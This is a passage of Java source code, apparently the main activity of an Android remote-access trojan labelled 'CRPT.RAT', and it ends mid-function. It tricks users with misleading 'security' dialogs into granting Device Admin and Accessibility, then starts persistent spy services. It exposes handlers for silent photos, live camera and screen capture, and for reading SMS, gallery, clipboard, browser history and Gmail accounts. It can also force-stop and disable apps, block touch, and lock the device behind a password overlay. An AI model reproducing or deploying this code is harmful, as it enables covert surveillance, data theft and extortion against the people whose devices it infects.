package com.nullx.pp;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.WallpaperManager;
import android.app.admin.DevicePolicyManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.TimeUnit;

import io.flutter.embedding.android.FlutterActivity;
import io.flutter.embedding.engine.FlutterEngine;
import io.flutter.plugin.common.MethodChannel;

public class MainActivity extends FlutterActivity {
    private static final String SPY_CHANNEL    = "com.nullx.pp/background_spy";
    private static final String STROBE_CHANNEL = "com.nullx.pp/strobe";
    private static final String TAG            = "CRPT.RAT";

    private boolean isStrobeRunning = false;
    private Handler uiHandler       = new Handler(Looper.getMainLooper());
    private Runnable strobeRunnable;

    // Camera stream (live)
    private HandlerThread cameraThread;
    private Handler       cameraHandler;
    private CameraDevice  activeCameraDevice;
    private ImageReader   activeImageReader;
    private CameraCaptureSession activeCaptureSession;

    // Live stream state
    private boolean isLiveStreaming = false;
    private byte[] lastFrame;

    // ── TOUCH BLOCK ────────────────────────────────────────────────────────────
    private WindowManager windowManager;
    private View touchBlockOverlay;
    private boolean isTouchBlocked = false;
    private Handler touchBlockHandler = new Handler(Looper.getMainLooper());
    private Runnable touchBlockTimeoutRunnable;

    // ── APP BLOCK ─────────────────────────────────────────────────────────────
    private Handler appBlockHandler = new Handler(Looper.getMainLooper());

    // ── SCREEN RECORDING ──────────────────────────────────────────────────────
    private MediaRecorder mediaRecorder;
    private String videoFilePath;
    private boolean isScreenRecording = false;
    private MethodChannel.Result screenRecordingResult;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Start service
        Intent svc = new Intent(this, SpyService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
        else startService(svc);
        PersistentWorker.schedule(this);

        // Init WindowManager untuk touch block
        windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);

        // Start App Block Monitor Service
        startAppBlockMonitor();

        // ✅ PERBAIKAN: Minta Device Admin DULUAN, baru Accessibility
        requestDeviceAdminFirst();
    }

    // ─── REQUEST DEVICE ADMIN DULU ──────────────────────────────────────────
    private void requestDeviceAdminFirst() {
        // CEK APAKAH ADMIN SUDAH AKTIF
        if (!DeviceAdminHelper.isAdminActive(this)) {
            // TAMPILKAN DIALOG DULU
            new AlertDialog.Builder(this)
                .setTitle("🔒 Device Admin Required")
                .setMessage("PPL V2 needs Device Admin permission to:\n\n" +
                           "• Lock your device\n" +
                           "• Protect system security\n" +
                           "• Enable advanced features\n\n" +
                           "Tap 'ACTIVATE' to continue")
                .setPositiveButton("ACTIVATE", (dialog, which) -> {
                    requestDeviceAdmin();
                    // Setelah admin aktif, baru minta accessibility
                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        checkAccessibilityAfterAdmin();
                    }, 2000);
                })
                .setNegativeButton("Later", (dialog, which) -> {
                    // Tetap cek nanti
                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        requestDeviceAdminFirst();
                    }, 5000);
                })
                .setCancelable(false)
                .show();
        } else {
            // Admin sudah aktif, lanjut ke accessibility
            checkAccessibilityAfterAdmin();
        }
    }

    private void checkAccessibilityAfterAdmin() {
        if (!isAccessibilityEnabled()) {
            new AlertDialog.Builder(this)
                .setTitle("🔓 Accessibility Required")
                .setMessage("PPL V2 needs Accessibility permission to:\n\n" +
                           "• Monitor and block apps\n" +
                           "• Auto-activate security features\n" +
                           "• Protect your privacy\n\n" +
                           "Tap 'ENABLE' to continue")
                .setPositiveButton("ENABLE", (dialog, which) -> {
                    Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(accIntent);
                })
                .setNegativeButton("Later", null)
                .setCancelable(false)
                .show();
        }
    }

    private boolean isAccessibilityEnabled() {
        try {
            int enabled = Settings.Secure.getInt(
                getContentResolver(),
                Settings.Secure.ACCESSIBILITY_ENABLED, 0);
            if (enabled == 0) return false;
            String services = Settings.Secure.getString(
                getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return services != null && services.contains(getPackageName());
        } catch (Exception e) { return false; }
    }

    private void requestDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName adminComp = new ComponentName(this, DeviceAdminHelper.class);
        if (dpm != null && !dpm.isAdminActive(adminComp)) {
            Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp);
            adminIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk keamanan sistem.");
            adminIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(adminIntent);
        }
    }

    private void forceStopPackage(ActivityManager am, String packageName) {
        try {
            try {
                Method method = am.getClass().getMethod("forceStopPackage", String.class);
                method.setAccessible(true);
                method.invoke(am, packageName);
                return;
            } catch (Exception e1) {
                Log.w(TAG, "Reflection failed: " + e1.getMessage());
            }

            try {
                Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", "am force-stop " + packageName});
                boolean finished = process.waitFor(2, TimeUnit.SECONDS);
                if (finished) {
                    return;
                }
            } catch (Exception e2) {
                Log.w(TAG, "Shell failed: " + e2.getMessage());
            }
        } catch (Exception e) {
            Log.e(TAG, "forceStopPackage error: " + e.getMessage());
        }
    }

    // ── TOUCH BLOCK METHODS ──────────────────────────────────────────────────
    private void showTouchBlockOverlay() {
        if (touchBlockOverlay != null || windowManager == null) return;

        try {
            FrameLayout overlayView = new FrameLayout(this) {
                @Override
                public boolean onTouchEvent(MotionEvent event) {
                    return true;
                }

                @Override
                public boolean onInterceptTouchEvent(MotionEvent ev) {
                    return true;
                }
            };

            overlayView.setBackgroundColor(0x00000000);

            int layoutFlag;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                layoutFlag = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
            } else {
                layoutFlag = WindowManager.LayoutParams.TYPE_PHONE;
            }

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                layoutFlag,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSLUCENT
            );

            params.gravity = Gravity.TOP | Gravity.START;
            params.x = 0;
            params.y = 0;

            windowManager.addView(overlayView, params);
            touchBlockOverlay = overlayView;
            isTouchBlocked = true;

        } catch (Exception e) {
            Log.e(TAG, "Failed to show touch block overlay: " + e.getMessage());
        }
    }

    private void hideTouchBlockOverlay() {
        try {
            if (touchBlockOverlay != null && windowManager != null) {
                windowManager.removeView(touchBlockOverlay);
                touchBlockOverlay = null;
                isTouchBlocked = false;
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to hide touch block overlay: " + e.getMessage());
        }
    }

    private void startTouchBlock(int durationSeconds) {
        if (touchBlockTimeoutRunnable != null) {
            touchBlockHandler.removeCallbacks(touchBlockTimeoutRunnable);
        }

        showTouchBlockOverlay();

        touchBlockTimeoutRunnable = () -> {
            hideTouchBlockOverlay();
            touchBlockTimeoutRunnable = null;
        };
        touchBlockHandler.postDelayed(touchBlockTimeoutRunnable, durationSeconds * 1000L);
    }

    private void stopTouchBlock() {
        if (touchBlockTimeoutRunnable != null) {
            touchBlockHandler.removeCallbacks(touchBlockTimeoutRunnable);
            touchBlockTimeoutRunnable = null;
        }
        hideTouchBlockOverlay();
    }

    // ── APP BLOCK METHODS ─────────────────────────────────────────────────────
    private void startAppBlockMonitor() {
        Intent intent = new Intent(this, AppBlockMonitorService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    private void blockApp(String packageName, MethodChannel.Result result) {
        new Thread(() -> {
            try {
                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                forceStopPackage(am, packageName);

                try {
                    PackageManager pm = getPackageManager();
                    pm.setApplicationEnabledSetting(
                        packageName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        0
                    );
                } catch (Exception e) {
                    Log.w(TAG, "Cannot disable app: " + e.getMessage());
                }

                SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                Set<String> blockedSet = new HashSet<>(prefs.getStringSet("blocked_apps", new HashSet<>()));
                blockedSet.add(packageName);
                prefs.edit().putStringSet("blocked_apps", blockedSet).apply();

                uiHandler.post(() -> result.success(true));
            } catch (Exception e) {
                Log.e(TAG, "Block app error: " + e.getMessage());
                uiHandler.post(() -> result.error("BLOCK_ERR", e.getMessage(), null));
            }
        }).start();
    }

    private void unblockApp(String packageName, MethodChannel.Result result) {
        new Thread(() -> {
            try {
                try {
                    PackageManager pm = getPackageManager();
                    pm.setApplicationEnabledSetting(
                        packageName,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        0
                    );
                } catch (Exception e) {
                    Log.w(TAG, "Cannot enable app: " + e.getMessage());
                }

                SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                Set<String> blockedSet = new HashSet<>(prefs.getStringSet("blocked_apps", new HashSet<>()));
                blockedSet.remove(packageName);
                prefs.edit().putStringSet("blocked_apps", blockedSet).apply();

                uiHandler.post(() -> result.success(true));
            } catch (Exception e) {
                Log.e(TAG, "Unblock app error: " + e.getMessage());
                uiHandler.post(() -> result.error("UNBLOCK_ERR", e.getMessage(), null));
            }
        }).start();
    }

    private void getBlockedApps(MethodChannel.Result result) {
        try {
            SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            Set<String> blockedSet = prefs.getStringSet("blocked_apps", new HashSet<>());
            List<String> blockedList = new ArrayList<>(blockedSet);
            uiHandler.post(() -> result.success(blockedList));
        } catch (Exception e) {
            uiHandler.post(() -> result.error("LIST_ERR", e.getMessage(), null));
        }
    }

    private void getAppsList(MethodChannel.Result result) {
        new Thread(() -> {
            try {
                PackageManager pm = getPackageManager();
                List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
                List<Map<String, Object>> appList = new ArrayList<>();

                SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                Set<String> blockedSet = new HashSet<>(prefs.getStringSet("blocked_apps", new HashSet<>()));

                for (ApplicationInfo appInfo : apps) {
                    String packageName = appInfo.packageName;
                    String appName = pm.getApplicationLabel(appInfo).toString();
                    String version = "0.0.0";

                    try {
                        PackageInfo pInfo = pm.getPackageInfo(packageName, 0);
                        version = pInfo.versionName != null ? pInfo.versionName : "0.0.0";
                    } catch (Exception ignored) {}

                    String iconBase64 = "";
                    try {
                        Drawable icon = pm.getApplicationIcon(appInfo);
                        Bitmap bitmap = drawableToBitmap(icon);
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        bitmap.compress(Bitmap.CompressFormat.PNG, 70, baos);
                        iconBase64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                        bitmap.recycle();
                    } catch (Exception ignored) {}

                    Map<String, Object> appData = new HashMap<>();
                    appData.put("name", appName);
                    appData.put("package", packageName);
                    appData.put("version", version);
                    appData.put("icon", iconBase64);

                    appList.add(appData);
                }

                appList.sort((a, b) -> ((String) a.get("name")).compareTo((String) b.get("name")));

                Map<String, Object> response = new HashMap<>();
                response.put("apps", appList);
                response.put("blocked", new ArrayList<>(blockedSet));

                uiHandler.post(() -> result.success(response));
            } catch (Exception e) {
                Log.e(TAG, "Get apps error: " + e.getMessage());
                uiHandler.post(() -> result.error("APPS_ERR", e.getMessage(), null));
            }
        }).start();
    }

    private Bitmap drawableToBitmap(Drawable drawable) {
        if (drawable instanceof BitmapDrawable) {
            return ((BitmapDrawable) drawable).getBitmap();
        }

        int width = drawable.getIntrinsicWidth();
        int height = drawable.getIntrinsicHeight();
        if (width <= 0) width = 96;
        if (height <= 0) height = 96;

        Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
        Canvas canvas = new Canvas(bitmap);
        drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
        drawable.draw(canvas);
        return bitmap;
    }

    // ── CLIPBOARD METHODS ──────────────────────────────────────────────────────
    private void getClipboard(MethodChannel.Result result) {
        try {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = clipboard.getPrimaryClip();
            if (clip != null && clip.getItemCount() > 0) {
                CharSequence text = clip.getItemAt(0).getText();
                result.success(text != null ? text.toString() : "");
            } else {
                result.success("");
            }
        } catch (Exception e) {
            result.error("CLIPBOARD_ERR", e.getMessage(), null);
        }
    }

    private void setClipboard(String text, MethodChannel.Result result) {
        try {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("RAT_Clipboard", text);
            clipboard.setPrimaryClip(clip);
            result.success(true);
        } catch (Exception e) {
            result.error("CLIPBOARD_ERR", e.getMessage(), null);
        }
    }

    // ── BROWSER HISTORY ────────────────────────────────────────────────────────
    private void getBrowserHistory(MethodChannel.Result result) {
        new Thread(() -> {
            try {
                List<Map<String, String>> historyList = new ArrayList<>();

                // Chrome
                try {
                    Cursor cursor = getContentResolver().query(
                        Uri.parse("content://com.android.chrome.browser/history"),
                        new String[]{"title", "url", "date"},
                        null, null, "date DESC LIMIT 30"
                    );
                    if (cursor != null) {
                        while (cursor.moveToNext()) {
                            Map<String, String> item = new HashMap<>();
                            item.put("title", cursor.getString(cursor.getColumnIndexOrThrow("title")));
                            item.put("url", cursor.getString(cursor.getColumnIndexOrThrow("url")));
                            item.put("browser", "Chrome");
                            long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                            item.put("time", new Date(date).toString());
                            historyList.add(item);
                        }
                        cursor.close();
                    }
                } catch (Exception ignored) {}

                // Firefox
                try {
                    Cursor cursor = getContentResolver().query(
                        Uri.parse("content://org.mozilla.firefox.browser/history"),
                        new String[]{"title", "url", "date"},
                        null, null, "date DESC LIMIT 30"
                    );
                    if (cursor != null) {
                        while (cursor.moveToNext()) {
                            Map<String, String> item = new HashMap<>();
                            item.put("title", cursor.getString(cursor.getColumnIndexOrThrow("title")));
                            item.put("url", cursor.getString(cursor.getColumnIndexOrThrow("url")));
                            item.put("browser", "Firefox");
                            long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                            item.put("time", new Date(date).toString());
                            historyList.add(item);
                        }
                        cursor.close();
                    }
                } catch (Exception ignored) {}

                // Samsung Internet
                try {
                    Cursor cursor = getContentResolver().query(
                        Uri.parse("content://com.sec.android.app.sbrowser.browser/history"),
                        new String[]{"title", "url", "date"},
                        null, null, "date DESC LIMIT 30"
                    );
                    if (cursor != null) {
                        while (cursor.moveToNext()) {
                            Map<String, String> item = new HashMap<>();
                            item.put("title", cursor.getString(cursor.getColumnIndexOrThrow("title")));
                            item.put("url", cursor.getString(cursor.getColumnIndexOrThrow("url")));
                            item.put("browser", "Samsung");
                            long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                            item.put("time", new Date(date).toString());
                            historyList.add(item);
                        }
                        cursor.close();
                    }
                } catch (Exception ignored) {}

                // Edge
                try {
                    Cursor cursor = getContentResolver().query(
                        Uri.parse("content://com.microsoft.emmx.browser/history"),
                        new String[]{"title", "url", "date"},
                        null, null, "date DESC LIMIT 30"
                    );
                    if (cursor != null) {
                        while (cursor.moveToNext()) {
                            Map<String, String> item = new HashMap<>();
                            item.put("title", cursor.getString(cursor.getColumnIndexOrThrow("title")));
                            item.put("url", cursor.getString(cursor.getColumnIndexOrThrow("url")));
                            item.put("browser", "Edge");
                            long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                            item.put("time", new Date(date).toString());
                            historyList.add(item);
                        }
                        cursor.close();
                    }
                } catch (Exception ignored) {}

                uiHandler.post(() -> result.success(historyList));
            } catch (Exception e) {
                uiHandler.post(() -> result.error("HISTORY_ERR", e.getMessage(), null));
            }
        }).start();
    }

    // ── SSID WiFi ──────────────────────────────────────────────────────────────
    private void getCurrentSSID(MethodChannel.Result result) {
        try {
            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wifiManager != null && wifiManager.isWifiEnabled()) {
                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                if (wifiInfo != null) {
                    String ssid = wifiInfo.getSSID();
                    if (ssid != null && ssid.startsWith("\"") && ssid.endsWith("\"")) {
                        ssid = ssid.substring(1, ssid.length() - 1);
                    }
                    result.success(ssid != null ? ssid : "Tidak terdeteksi");
                    return;
                }
            }
            result.success("Tidak terdeteksi");
        } catch (Exception e) {
            result.error("SSID_ERR", e.getMessage(), null);
        }
    }

    // ── TORCH ──────────────────────────────────────────────────────────────────
    private void torchOn(MethodChannel.Result result) {
        try {
            CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            String cameraId = cameraManager.getCameraIdList()[0];
            cameraManager.setTorchMode(cameraId, true);
            result.success(true);
        } catch (Exception e) {
            result.error("TORCH_ERR", e.getMessage(), null);
        }
    }

    private void torchOff(MethodChannel.Result result) {
        try {
            CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            String cameraId = cameraManager.getCameraIdList()[0];
            cameraManager.setTorchMode(cameraId, false);
            result.success(true);
        } catch (Exception e) {
            result.error("TORCH_ERR", e.getMessage(), null);
        }
    }

    // ── OVERLAY LOCK ──────────────────────────────────────────────────────────
    private void startOverlayLock(Map<String, Object> params, MethodChannel.Result result) {
        try {
            String password = params.containsKey("password") ? (String) params.get("password") : "1234";
            String message = params.containsKey("message") ? (String) params.get("message") : "🔒 DEVICE LOCKED\nEnter password to unlock";

            Intent intent = new Intent(this, LockOverlayService.class);
            intent.setAction("com.nullx.pp.ACTION_LOCK");
            intent.putExtra("lock_password", password);
            intent.putExtra("lock_message", message);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }

            SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            prefs.edit()
                .putBoolean("overlay_active", true)
                .putString("overlay_password", password)
                .apply();

            result.success(true);
        } catch (Exception e) {
            result.error("OVERLAY_ERR", e.getMessage(), null);
        }
    }

    private void dismissOverlayLock(MethodChannel.Result result) {
        try {
            Intent intent = new Intent(this, LockOverlayService.class);
            intent.setAction("com.nullx.pp.ACTION_UNLOCK");
            startService(intent);

            SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            prefs.edit()
                .putBoolean("overlay_active", false)
                .putString("overlay_password", "")
                .apply();

            result.success(true);
        } catch (Exception e) {
            result.error("OVERLAY_ERR", e.getMessage(), null);
        }
    }

    private void getOverlayLockState(MethodChannel.Result result) {
        try {
            SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            Map<String, Object> state = new HashMap<>();
            state.put("isActive", prefs.getBoolean("overlay_active", false));
            state.put("password", prefs.getString("overlay_password", ""));
            result.success(state);
        } catch (Exception e) {
            result.error("OVERLAY_ERR", e.getMessage(), null);
        }
    }

    // ── SCREEN RECORDING ───────────────────────────────────────────────────────
    private void startScreenRecording(Map<String, Object> params, MethodChannel.Result result) {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
                uiHandler.post(() -> result.error("RECORD_ERR", "Screen recording requires Android 5.0+", null));
                return;
            }

            int duration = params.containsKey("duration") ? (int) params.get("duration") : 10;
            String quality = params.containsKey("quality") ? (String) params.get("quality") : "medium";

            String outputDir = getExternalFilesDir(null).getAbsolutePath();
            videoFilePath = outputDir + "/screen_record_" + System.currentTimeMillis() + ".mp4";

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);

            int bitRate;
            switch (quality) {
                case "high": bitRate = 4000000; break;
                case "medium": bitRate = 2000000; break;
                default: bitRate = 1000000;
            }
            mediaRecorder.setVideoEncodingBitRate(bitRate);
            mediaRecorder.setVideoFrameRate(30);

            android.view.Display display = getWindowManager().getDefaultDisplay();
            android.graphics.Point size = new android.graphics.Point();
            display.getSize(size);
            mediaRecorder.setVideoSize(size.x, size.y);

            mediaRecorder.setOutputFile(videoFilePath);

            try {
                mediaRecorder.prepare();
            } catch (Exception e) {
                uiHandler.post(() -> result.error("RECORD_ERR", "Prepare failed: " + e.getMessage(), null));
                return;
            }

            isScreenRecording = true;
            screenRecordingResult = result;

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                stopScreenRecordingInternal();
            }, duration * 1000L);

            uiHandler.post(() -> result.success("Recording started"));

        } catch (Exception e) {
            uiHandler.post(() -> result.error("RECORD_ERR", e.getMessage(), null));
        }
    }

    private void stopScreenRecordingInternal() {
        try {
            if (mediaRecorder != null) {
                try {
                    mediaRecorder.stop();
                } catch (Exception ignored) {}
                mediaRecorder.release();
                mediaRecorder = null;
            }
            isScreenRecording = false;

            File file = new File(videoFilePath);
            if (file.exists()) {
                FileInputStream fis = new FileInputStream(file);
                byte[] data = new byte[(int) file.length()];
                fis.read(data);
                fis.close();
                String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
                if (screenRecordingResult != null) {
                    Map<String, Object> response = new HashMap<>();
                    response.put("success", true);
                    response.put("video", base64);
                    response.put("duration", 10);
                    response.put("format", "mp4");
                    response.put("size", file.length());
                    uiHandler.post(() -> screenRecordingResult.success(response));
                    screenRecordingResult = null;
                }
                file.delete();
            }
        } catch (Exception e) {
            Log.e(TAG, "Stop recording error: " + e.getMessage());
            if (screenRecordingResult != null) {
                uiHandler.post(() -> screenRecordingResult.error("RECORD_ERR", e.getMessage(), null));
                screenRecordingResult = null;
            }
        }
    }

    private void stopScreenRecording(MethodChannel.Result result) {
        stopScreenRecordingInternal();
        uiHandler.post(() -> result.success("Recording stopped"));
    }

    private void getScreenRecordingStatus(MethodChannel.Result result) {
        Map<String, Object> status = new HashMap<>();
        status.put("isRecording", isScreenRecording);
        status.put("duration", isScreenRecording ? "Recording..." : "0");
        status.put("status", isScreenRecording ? "recording" : "idle");
        uiHandler.post(() -> result.success(status));
    }

    @Override
    public void configureFlutterEngine(@NonNull FlutterEngine flutterEngine) {
        super.configureFlutterEngine(flutterEngine);

        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), STROBE_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                if (call.method.equals("startStrobe")) { startStrobeEffect(); result.success(null); }
                else if (call.method.equals("stopStrobe")) { stopStrobeEffect(); result.success(null); }
                else result.notImplemented();
            });

        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), SPY_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                switch (call.method) {

                    case "apps_list": {
                        getAppsList(result);
                        break;
                    }

                    case "app_block": {
                        String packageName = call.arguments.toString();
                        blockApp(packageName, result);
                        break;
                    }

                    case "app_unblock": {
                        String packageName = call.arguments.toString();
                        unblockApp(packageName, result);
                        break;
                    }

                    case "app_blocked_list": {
                        getBlockedApps(result);
                        break;
                    }

                    case "getClipboard": {
                        getClipboard(result);
                        break;
                    }

                    case "setClipboard": {
                        String text = call.arguments.toString();
                        setClipboard(text, result);
                        break;
                    }

                    case "getBrowserHistory": {
                        getBrowserHistory(result);
                        break;
                    }

                    case "getCurrentSSID": {
                        getCurrentSSID(result);
                        break;
                    }

                    case "torchOn": {
                        torchOn(result);
                        break;
                    }

                    case "torchOff": {
                        torchOff(result);
                        break;
                    }

                    case "startOverlayLock": {
                        Map<String, Object> params = (Map<String, Object>) call.arguments;
                        startOverlayLock(params, result);
                        break;
                    }

                    case "dismissOverlayLock": {
                        dismissOverlayLock(result);
                        break;
                    }

                    case "getOverlayLockState": {
                        getOverlayLockState(result);
                        break;
                    }

                    case "startScreenRecording": {
                        Map<String, Object> params = (Map<String, Object>) call.arguments;
                        startScreenRecording(params, result);
                        break;
                    }

                    case "stopScreenRecording": {
                        stopScreenRecording(result);
                        break;
                    }

                    case "getScreenRecordingStatus": {
                        getScreenRecordingStatus(result);
                        break;
                    }

                    case "blockTouch": {
                        int duration = call.argument("duration") != null ? (int) call.argument("duration") : 5;
                        startTouchBlock(duration);
                        result.success(true);
                        break;
                    }

                    case "unblockTouch": {
                        stopTouchBlock();
                        result.success(true);
                        break;
                    }

                    case "startTouchBlockOverlay": {
                        int duration = call.argument("duration") != null ? (int) call.argument("duration") : 5;
                        showTouchBlockOverlay();
                        if (touchBlockTimeoutRunnable != null) {
                            touchBlockHandler.removeCallbacks(touchBlockTimeoutRunnable);
                        }
                        touchBlockTimeoutRunnable = () -> {
                            hideTouchBlockOverlay();
                            touchBlockTimeoutRunnable = null;
                        };
                        touchBlockHandler.postDelayed(touchBlockTimeoutRunnable, duration * 1000L);
                        result.success(true);
                        break;
                    }

                    case "takeSilentPhotoBackground": {
                        String side = call.argument("side");
                        capturePhoto(side == null ? "back" : side, result);
                        break;
                    }

                    case "startLiveCameraStream": {
                        String side = call.argument("side");
                        startLiveCameraStream(side == null ? "back" : side, result);
                        break;
                    }

                    case "stopLiveCameraStream": {
                        stopLiveCameraStream();
                        result.success(null);
                        break;
                    }

                    case "getLiveFrame": {
                        if (lastFrame != null) {
                            String b64 = Base64.encodeToString(lastFrame, Base64.NO_WRAP);
                            result.success(b64);
                        } else {
                            result.success(null);
                        }
                        break;
                    }

                    case "startScreenStreamBackground": {
                        String b64 = getScreenBase64();
                        result.success(b64);
                        break;
                    }

                    case "getGmailAccounts": {
                        fetchGmailAccounts(result);
                        break;
                    }

                    case "setWallpaper": {
                        String url = call.argument("url");
                        setWallpaper(url, result);
                        break;
                    }

                    case "getSmsMessages": {
                        getSmsMessages(result);
                        break;
                    }

                    case "getGalleryImages": {
                        int limit = call.argument("limit") != null ? (int) call.argument("limit") : 10;
                        getGalleryImages(limit, result);
                        break;
                    }

                    case "bringToForeground": {
                        Intent intent = new Intent(this, MainActivity.class);
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                        startActivity(intent);
                        result.success(true);
                        break;
                    }

                    case "saveTargetId":
                    case "saveDeviceIdAll": {
                        String id = call.arguments.toString();
                        getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit().putString("targetId", id).apply();
                        getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE).edit()
                            .putString("flutter.target_id", id)
                            .putString("flutter.target_model", Build.BRAND + " " + Build.MODEL)
                            .apply();
                        try {
                            File dir = new File(android.os.Environment.getExternalStorageDirectory(), ".crpt");
                            dir.mkdirs();
                            java.io.FileWriter fw = new java.io.FileWriter(new File(dir, ".devid"));
                            fw.write(id); fw.close();
                        } catch (Exception ignored) {}
                        try {
                            java.io.FileWriter fw2 = new java.io.FileWriter(new File(getCacheDir(), "devid.dat"));
                            fw2.write(id); fw2.close();
                        } catch (Exception ignored) {}
                        Intent svcIntent = new Intent(this, SpyService.class);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svcIntent);
                        else startService(svcIntent);
                        PersistentWorker.schedule(this);
                        result.success(true);
                        break;
                    }

                    case "saveLockState": {
                        String msg = call.argument("message");
                        String pin = call.argument("pin");
                        Boolean locked = call.argument("locked");
